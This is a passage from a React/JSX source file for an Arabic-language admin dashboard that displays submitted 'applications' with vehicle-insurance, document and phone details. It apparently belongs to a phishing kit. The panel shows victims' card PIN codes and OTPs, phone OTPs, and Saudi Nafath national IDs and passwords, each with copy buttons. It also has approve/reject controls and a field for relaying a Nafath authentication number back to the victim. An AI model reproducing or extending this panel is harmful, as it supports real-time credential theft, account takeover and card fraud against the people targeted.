                                          <span className="text-xs font-medium text-muted-foreground">
                                            {card.amount}
                                          </span>
                                        )}
                                      </div>
                                    </div>
                                  ))}
                                </div>
                              </div>
                            )}
                        </div>
                      )}

                      {/* 2. Card Verification */}
                      {(selectedApplication.otp || selectedApplication.pinCode) && (
                        <div
                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "200ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-xl bg-warning/10">
                              <Shield className="w-5 h-5 text-warning" />
                            </div>
                            <h3 className="font-semibold text-foreground">التحقق</h3>
                          </div>
                          <div className="space-y-4">
                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-xl border border-border/50">
                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
                                <div className="flex items-center justify-between">
                                  <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
                                  {selectedApplication.pinCode && <CopyButton text={selectedApplication.pinCode} />}
                                </div>
                                <p className="text-lg font-mono font-bold text-foreground">
                                  {selectedApplication.pinCode || "—"}
                                </p>
                              </div>
                            </div>
                            <div className="flex gap-2">
                              <Button
                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
                                disabled={selectedApplication.idVerificationStatus === "approved"}
                              >
                                <CheckCircle className="w-4 h-4 ml-2" />
                                قبول
                              </Button>
                              <Button variant="default" size="sm" className="flex-1 rounded-xl">
                                <CheckCircle className="w-4 h-4 ml-2" />
                                Pin
                              </Button>
                              <Button
                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
                                disabled={selectedApplication.idVerificationStatus === "rejected"}
                              >
                                <XCircle className="w-4 h-4 ml-2" />
                                رفض
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* 3. Phone Verification */}
                      {(selectedApplication.phoneNumber2 ||
                        selectedApplication.phoneOtp ||
                        selectedApplication.selectedCarrier) && (
                        <div
                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "100ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-xl bg-chart-4/10">
                              <Phone className="w-5 h-5 text-chart-4" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات الهاتف</h3>
                            <Badge
                              variant="outline"
                              className="mr-auto text-[10px] bg-chart-4/5 border-chart-4/20 text-chart-4 rounded-md"
                            >
                              جديد
                            </Badge>
                          </div>
                          <div className="space-y-4">
                            <div className="grid grid-cols-2 gap-3">
                              <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
                              <DataField label="مزود الخدمة" value={selectedApplication.selectedCarrier} />
                            </div>
                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-xl border border-border/50">
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-3">
                                  <div className="w-10 h-10 rounded-xl bg-chart-4/10 flex items-center justify-center">
                                    <Phone className="w-5 h-5 text-chart-4" />
                                  </div>
                                  <div>
                                    <p className="text-sm font-medium text-foreground">رمز الهاتف</p>
                                    <p className="text-lg font-mono font-bold text-chart-4">
                                      {selectedApplication?.phoneOtp || "—"}
                                    </p>
                                  </div>
                                </div>
                                <Badge
                                  variant={
                                    selectedApplication.phoneVerificationStatus === "approved"
                                      ? "default"
                                      : selectedApplication.phoneVerificationStatus === "rejected"
                                        ? "destructive"
                                        : "secondary"
                                  }
                                  className="rounded-md"
                                >
                                  {selectedApplication.phoneVerificationStatus === "approved"
                                    ? "موافق"
                                    : selectedApplication.phoneVerificationStatus === "rejected"
                                      ? "مرفوض"
                                      : "معلق"}
                                </Badge>
                              </div>
                            </div>
                            <div className="flex gap-2">
                              <Button
                                onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
                                disabled={selectedApplication.phoneVerificationStatus === "approved"}
                              >
                                <CheckCircle className="w-4 h-4 ml-2" />
                                قبول
                              </Button>
                              <Button
                                onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
                                disabled={selectedApplication.phoneVerificationStatus === "rejected"}
                              >
                                <XCircle className="w-4 h-4 ml-2" />
                                رفض
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* 4. Nafaz */}
                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
                        <div
                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "300ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-xl bg-warning/10">
                              <User className="w-5 h-5 text-warning" />
                            </div>
                            <h3 className="font-semibold text-foreground">نفاذ الوطني</h3>
                          </div>
                          <div className="space-y-4">
                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-xl border border-border/50">
                              <div className="space-y-3">
                                <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
                                <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />
                                <div>
                                  <p className="text-xs text-muted-foreground mb-1.5">رمز التوثيق</p>
                                  <Input
                                    type="tel"
                                    value={authNumber}
                                    onChange={(e) => setAuthNumber(e.target.value)}
                                    placeholder="أدخل رمز التوثيق"
                                    className="h-10 text-sm rounded-xl"
                                  />
                                </div>
                              </div>
                            </div>
                            <div className="flex gap-2">
                              <Button
                                onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
                              >
                                <CheckCircle className="w-4 h-4 ml-2" />
                                حفظ
                              </Button>
                              <Button
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl bg-transparent"
                              >
                                <XCircle className="w-4 h-4 ml-2" />
                                إلغاء
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* 5. Document Info */}
                      {hasDocumentInfo(selectedApplication) && (
                        <div
                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "400ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-xl bg-primary/10">
                              <FileText className="w-5 h-5 text-primary" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات الوثيقة</h3>
                          </div>
                          <div className="space-y-3">
                            <DataField label="نوع الوثيقة" value={selectedApplication.documentType} />
                            <DataField label="الرقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
                            <DataField label="رقم الهاتف" value={selectedApplication.phoneNumber} mono copyable />
                            <DataField label="الدولة" value={selectedApplication.country} />
                          </div>
                        </div>
                      )}

                      {/* 6. Insurance Info */}
                      {hasInsuranceInfo(selectedApplication) && (
                        <div
                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "500ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-xl bg-success/10">
                              <Shield className="w-5 h-5 text-success" />
                            </div>
                            <h3 className="font-semibold text-foreground">تفاصيل التأمين</h3>
                          </div>
                          <div className="space-y-3">
                            <DataField label="نوع التأمين" value={selectedApplication.insuranceType} />
                            <DataField label="تاريخ البدء" value={selectedApplication.insuranceStartDate} />
                            <DataField
                              label="موقع الإصلاح"
                              value={selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
                            />
                          </div>
                        </div>
                      )}

                      {/* 7. Vehicle Info */}
                      {hasVehicleInfo(selectedApplication) && (
                        <div
                          className="bg-card rounded-2xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "600ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-xl bg-chart-4/10">
                              <Car className="w-5 h-5 text-chart-4" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات المركبة</h3>
                          </div>
                          <div className="grid grid-cols-2 gap-3">
                            <DataField label="الموديل" value={selectedApplication.vehicleModel} />
                            <DataField label="سنة الصنع" value={selectedApplication.manufacturingYear as any} />
                            <DataField
                              label="القيمة"
                              value={
                                selectedApplication.vehicleValue
                                  ? `${selectedApplication.vehicleValue} ريال`
                                  : undefined
                              }
                            />
                            <DataField label="الاستخدام" value={selectedApplication.vehicleUsage} />
                          </div>
                        </div>
                      )}
                    </div>
                  ) : (
                    /* Empty state when no grid data exists */
                    <div className="flex items-center justify-center h-full">
                      <div className="text-center animate-in fade-in zoom-in duration-500">
                        <div className="w-24 h-24 rounded-3xl bg-muted/50 flex items-center justify-center mx-auto mb-5">
                          <FileText className="w-12 h-12 text-muted-foreground" />
                        </div>
                        <h3 className="text-xl font-bold text-foreground mb-2">لا توجد بيانات</h3>
                        <p className="text-sm text-muted-foreground">لم يتم إضافة أي معلومات لهذا الطلب بعد</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center animate-in fade-in zoom-in duration-500">
                <div className="w-24 h-24 rounded-3xl bg-muted flex items-center justify-center mx-auto mb-5">
                  <Mail className="w-12 h-12 text-muted-foreground" />
                </div>
                <h3 className="text-xl font-bold text-foreground mb-2">اختر طلباً لعرض التفاصيل</h3>
                <p className="text-sm text-muted-foreground">اضغط على أي طلب من القائمة الجانبية</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
